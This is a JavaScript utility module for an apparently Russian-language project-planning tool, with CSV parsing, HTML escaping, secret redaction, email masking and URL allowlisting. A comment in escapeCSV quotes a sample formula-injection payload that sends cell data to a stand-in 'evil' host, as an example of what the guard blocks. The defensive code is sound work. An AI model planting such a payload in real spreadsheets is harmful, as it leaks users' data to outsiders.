'use strict';
/* ============================================================
   UTILS — v8_0 ES module
   ============================================================ */

import { LEGACY_WT_MAP } from './constants.js';
import { state } from './state.js';

export function nextId() { return 'r_' + (state._idCounter++).toString(36) + '_' + Date.now().toString(36); }

export const Utils = {
  normalizeHeader(h) {
    if (h == null) return '';
    return String(h).replace(/\r?\n/g,' ').replace(/\u00a0/g,' ')
      // eslint-disable-next-line no-misleading-character-class -- intentional: strip zero-width joiners + BOM
      .replace(/[\u200b\u200c\u200d\ufeff]/g,'').replace(/\s+/g,' ').trim().toLowerCase();
  },
  mapHeader(n) {
    if (n==='категория') return 'category';
    if (n==='теги') return 'tags';
    if (n==='эпик') return 'epic';
    if (n==='роль'||n==='роли') return 'role';
    if (n==='исполнитель'||n==='исполнители') return 'assignee';
    if (n==='период работ') return 'work_period';
    if (n==='оценка') return 'estimation_legacy';
    if (n==='задачи') return 'tasks';
    if (n==='коммент к задачам') return 'task_comment';
    if (n==='зависимость от команд') return 'team_dependency';
    if (n==='риски') return 'risks';
    if (n.includes('релиз 1.20')) return 'release120';
    if (n.includes('релиз 1.21')) return 'release121';
    if (n.includes('релиз 1.22')) return 'release122';
    if (n.includes('входит в скоуп')) return 'scope';
    if (n==='комментарий') return 'comment';
    return null;
  },
  parseLegacyRelease(raw) {
    if (!raw) return [];
    const s = String(raw).trim();
    if (!s||s==='-'||s.toLowerCase()==='нет'||s==='0') return [];
    const lower = s.toLowerCase();
    const truthy = ['+','да','yes','1','x','✓','✔'];
    if (truthy.includes(lower)) return ['backend'];
    const parts = s.split(/[,;\n\/]+/).map(p=>p.trim().toLowerCase()).filter(Boolean);
    const res = [];
    for (const p of parts) {
      const m = LEGACY_WT_MAP[p];
      if (m) res.push(m);
      else if (truthy.includes(p)) res.push('backend');
    }
    return [...new Set(res.filter(Boolean))];
  },
  parsePipe(raw) {
    if (!raw) return [];
    return String(raw).split('|').map(s=>s.trim()).filter(Boolean);
  },
  parseDateish(raw) {
    if (!raw) return '';
    const s=String(raw).trim();
    const iso=s.match(/\b(\d{4})-(\d{2})-(\d{2})\b/);
    if (iso) return `${iso[1]}-${iso[2]}-${iso[3]}`;
    const ru=s.match(/\b(\d{1,2})[./](\d{1,2})[./](\d{2,4})\b/);
    if (ru) {
      const y=ru[3].length===2?'20'+ru[3]:ru[3];
      return `${y}-${ru[2].padStart(2,'0')}-${ru[1].padStart(2,'0')}`;
    }
    const d=new Date(s);
    return Number.isNaN(d.getTime())?'':d.toISOString().slice(0,10);
  },
  parseDateRange(raw) {
    if (!raw) return {start:'',end:''};
    const matches=String(raw).match(/\d{4}-\d{2}-\d{2}|\d{1,2}[./]\d{1,2}[./]\d{2,4}/g) || [];
    return { start:Utils.parseDateish(matches[0]||raw), end:Utils.parseDateish(matches[1]||matches[0]||raw) };
  },
  parseDateList(raw) {
    if (!raw) return [];
    const parts=String(raw).split(/[|,;\n]+/).map(s=>s.trim()).filter(Boolean);
    return [...new Set(parts.map(p=>Utils.parseDateish(p)||p).filter(Boolean))];
  },
  toBool(raw, fallback=false) {
    if (typeof raw==='boolean') return raw;
    if (typeof raw==='number') return raw!==0;
    const s=String(raw||'').trim().toLowerCase();
    if (['true','1','yes','on','да','y','ok'].includes(s)) return true;
    if (['false','0','no','off','нет','n',''].includes(s)) return false;
    return !!fallback;
  },
  escapeHtml(v) {
    return String(v==null?'':v)
      .replace(/&/g,'&amp;')
      .replace(/</g,'&lt;')
      .replace(/>/g,'&gt;')
      .replace(/"/g,'&quot;')
      .replace(/'/g,'&#39;');
  },
  hexToRgba(hex, alpha=0.14) {
    const h=String(hex||'').trim().replace('#','');
    if (!/^[0-9a-fA-F]{6}$/.test(h)) return '';
    const r=parseInt(h.slice(0,2),16);
    const g=parseInt(h.slice(2,4),16);
    const b=parseInt(h.slice(4,6),16);
    return `rgba(${r},${g},${b},${alpha})`;
  },
  mapEmployeeHeader(n) {
    if (!n) return null;
    if (n==='фио' || n==='сотрудник' || n==='имя') return 'fio';
    if (n==='роль' || n==='роли') return 'roles';
    if (n==='команда' || n==='команды') return 'teams';
    if (n.includes('дни') && n.includes('овер')) return 'overtimeDays';
    if ((n.includes('готов') || n.includes('может')) && n.includes('будн')) return 'weekdayReady';
    if (n.includes('комментар') && n.includes('будн')) return 'weekdayComment';
    return null;
  },
  serializePipe(arr) { return Array.isArray(arr) ? arr.join('|') : ''; },
  scopeFromRaw(raw) {
    if (!raw) return '';
    const s = String(raw).trim().toLowerCase();
    if (s==='да'||s==='yes'||s==='+'||s==='1') return 'Да';
    if (s==='нет'||s==='no'||s==='-'||s==='0') return 'Нет';
    if (s.includes('подтвержд')||s.includes('требует')) return 'Требует подтверждения';
    if (s) return raw.trim().charAt(0).toUpperCase()+raw.trim().slice(1);
    return '';
  },
  /**
   * V18 P6 — централизованный redact для текстов которые могут содержать
   * echo'enные токены (некоторые корп-proxy возвращают `Authorization`
   * header в response body; LLM-провайдеры могут ECHO'нуть Bearer).
   *
   * Применять ВЕЗДЕ где error-text от внешнего сервиса всплывает в UI / logs:
   *   - integrations/employeePerformance.js fetchModel error path
   *   - integrationsSync.js syncJiraRow / syncBitbucketRow / syncConfluenceRow
   *   - app/llmAssistant.js streaming error path
   *
   * Mirror серверной функции `_ppRedactSecretsInText` в server.js.
   *
   * @param {*} text  raw external text
   * @param {number} [maxLen=200]
   * @returns {string} безопасный для логов / toast'ов
   */
  redactSecretsInText(text, maxLen = 200) {
    return String(text == null ? '' : text).slice(0, maxLen)
      .replace(/Bearer\s+[A-Za-z0-9\-_=.]+/gi, 'Bearer ***')
      .replace(/(Authorization|X-API-Key)\s*[:=]\s*[^\s,;]+/gi, '$1: ***')
      .replace(/(token|secret|password|apiKey|authKey)\s*[:=]\s*[^\s,;"]+/gi, '$1: ***');
  },

  /**
   * V20 S2 — Scrub-contract helpers для diagnostic JSON export.
   *
   * Применяются ТОЛЬКО в `mode='safe'` экспорта. Для `mode='raw'`
   * безопасный экспорт пропускается, но disclaimer-modal требует
   * явного консента + audit log в localStorage.
   *
   * Контракт документирован в docs/integrations/auth-and-secrets.md
   * (раздел «Diagnostic export»).
   */

  /**
   * Mask email для diagnostic exports. Сохраняет домен (полезно
   * для дебага «не то поле domain» / «не тот @sber.ru»), но скрывает
   * локальную часть до первой буквы.
   *   ivanov.ii@sber.ru   →  i******@sber.ru
   *   x@a.b               →  x@a.b   (1-symbol local — не маскируем)
   *   плохой_input        →  ***
   */
  maskEmail(email) {
    if (!email || typeof email !== 'string') return '';
    const at = email.indexOf('@');
    if (at < 1 || at === email.length - 1) return '***';
    const local = email.slice(0, at);
    const domain = email.slice(at + 1);
    if (local.length <= 1) return email;     // одно-буквенный local не выдаёт идентичность
    return local[0] + '*'.repeat(Math.min(local.length - 1, 6)) + '@' + domain;
  },

  /**
   * Hash accountId/jiraAccountId/bitbucketLogin/etc. в коротный токен,
   * стабильный В ПРЕДЕЛАХ ОДНОГО ЭКСПОРТА (per-export salt). Это значит:
   *   - в одном JSON одного и того же сотрудника видно как одинаковый hash
   *     (можно coreлировать события одного человека между секциями)
   *   - между разными экспортами hash меняется (нельзя re-identify
   *     по двум JSON'ам, отправленным в разные дни)
   *
   * Реализация — sync FNV-1a (no crypto dependency, browser+node одинаково).
   * НЕ криптографически стойкая, но достаточная для anti-correlation.
   *
   *   hashAccountId('aaa', 'salt-2026-05-02') → 'h:7c3a91'
   */
  hashAccountId(id, salt) {
    if (!id) return '';
    const s = String(salt || '') + ':' + String(id);
    let h = 0x811c9dc5;
    for (let i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = (h * 0x01000193) >>> 0;     // FNV prime, keep unsigned 32-bit
    }
    return 'h:' + h.toString(16).padStart(8, '0').slice(0, 6);
  },

  /**
   * Truncate Jira issue.summary / Confluence page-title для diagnostic
   * exports. Default 30 символов — баланс между «понять о чём задача»
   * и «не утечь sensitive content». Эллипсис ставится только если
   * truncation реально произошёл.
   */
  truncateSummary(text, maxLen = 30) {
    if (!text || typeof text !== 'string') return '';
    const s = text.trim();
    if (s.length <= maxLen) return s;
    return s.slice(0, maxLen).trimEnd() + '…';
  },

  /**
   * Per-export salt для hashAccountId. Random per-export, без persist'а.
   * Используется ОДИН раз внутри prepareDiagnosticExport — все hash'и
   * в одном JSON получаются стабильными между собой, между разными
   * экспортами salt разный → re-identification по двум JSON'ам не
   * возможна.
   */
  newExportSalt() {
    // 8 random bytes хватит — это NOT cryptographic key, просто salt.
    const a = new Uint8Array(8);
    if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
      crypto.getRandomValues(a);
    } else {
      for (let i = 0; i < a.length; i++) a[i] = Math.floor(Math.random() * 256);
    }
    return Array.from(a, b => b.toString(16).padStart(2, '0')).join('');
  },
  escapeCSV(v) {
    if (v==null) return '';
    let s = String(v);
    // V17 P9 (QA 1.4) — CSV formula injection guard. Excel / LibreOffice
    // / Google Sheets evaluate cells starting with `= + - @` (and tab/CR
    // tricks) as formulas. A user could exfiltrate data via
    // `=HYPERLINK("evil/?leak="&A1, "ok")`. Prefix with U+200B
    // (zero-width space) so the cell is treated as text but stays
    // visually identical. Audit 2026-05-V17 (QA, registry §1.4).
    if (s && /^[=+\-@\t\r]/.test(s)) s = '​' + s;
    if (s.includes(',')||s.includes('"')||s.includes('\n')||s.includes('\r')) return '"'+s.replace(/"/g,'""')+'"';
    return s;
  },
  parseCSVLine(line) {
    const r=[]; let cur='', inQ=false;
    for (let i=0;i<line.length;i++) {
      const c=line[i];
      if (inQ) { if (c==='"'&&line[i+1]==='"'){cur+='"';i++;} else if(c==='"'){inQ=false;} else{cur+=c;} }
      else { if(c==='"'){inQ=true;} else if(c===','){r.push(cur);cur='';} else{cur+=c;} }
    }
    r.push(cur); return r;
  },
  parseFullCSV(text) {
    // Splits on newlines while respecting quoted fields (RFC 4180).
    // Preserves raw quote chars so parseCSVLine can handle them correctly.
    const lines=[]; let cur='', inQ=false;
    for (let i=0;i<text.length;i++) {
      const c=text[i];
      if (inQ) {
        if(c==='"'&&text[i+1]==='"'){cur+='""';i++;} // keep escaped pair intact for parseCSVLine
        else if(c==='"'){inQ=false;cur+=c;}
        else{cur+=c;}
      }
      else {
        if(c==='"'){inQ=true;cur+=c;}
        else if(c==='\n'){lines.push(cur);cur='';}
        else if(c==='\r'&&text[i+1]==='\n'){lines.push(cur);cur='';i++;}
        else if(c==='\r'){lines.push(cur);cur='';}
        else{cur+=c;}
      }
    }
    if (cur) lines.push(cur);
    return lines.map(l=>Utils.parseCSVLine(l));
  },
  truncate(s,n) { if(!s)return''; s=String(s); return s.length>n?s.slice(0,n)+'…':s; },
  unique(arr) { return [...new Set(arr.filter(Boolean))].sort(); },
  yieldToBrowser(ms=0) {
    return new Promise(resolve=>setTimeout(resolve,ms));
  },

  /**
   * V12 audit #3 — URL allowlist. Single source of truth so renderers don't
   * each carry their own `safeUrl` copy (was: 3 verbatim copies in
   * portfolioPulseRenderer, blackDashboardRenderer, techInfoRenderer).
   * Returns trimmed URL when it begins with `http(s):` or `mailto:`,
   * otherwise '' so the caller renders no link.
   */
  safeUrl(u) {
    const s = String(u || '').trim();
    return /^(https?:|mailto:)/i.test(s) ? s : '';
  },

  /**
   * V12 audit #4 — single builder for "open issue in Jira" links.
   * Returns '{base}/browse/{key}' or '' when either is missing.
   * Trims trailing slash and `safeUrl`-checks the base.
   */
  jiraIssueUrl(baseUrl, key) {
    const safe = Utils.safeUrl(baseUrl);
    if (!safe || !key) return '';
    return `${safe.replace(/\/+$/, '')}/browse/${encodeURIComponent(key)}`;
  },

  // Parse Jira-style URLs or standalone keys from a string
  parseJiraLinks(raw) {
    if (!raw) return [];
    const results = [];
    // Full URL pattern: .../browse/KEY-123
    const urlRe = /https?:\/\/[^\s,;"'<>]+\/browse\/([A-Z][A-Z0-9_]*-\d+)/gi;
    let m;
    while ((m = urlRe.exec(raw)) !== null) {
      results.push({ key: m[1], url: m[0] });
    }
    if (results.length) return results;
    // Standalone keys: KEY-123
    const keyRe = /\b([A-Z][A-Z0-9_]*-\d+)\b/g;
    while ((m = keyRe.exec(raw)) !== null) {
      results.push({ key: m[1], url: null });
    }
    if (results.length) return results;
    // Fallback: treat as plain text
    const trimmed = raw.trim();
    if (trimmed) results.push({ key: trimmed, url: null });
    return results;
  },
};
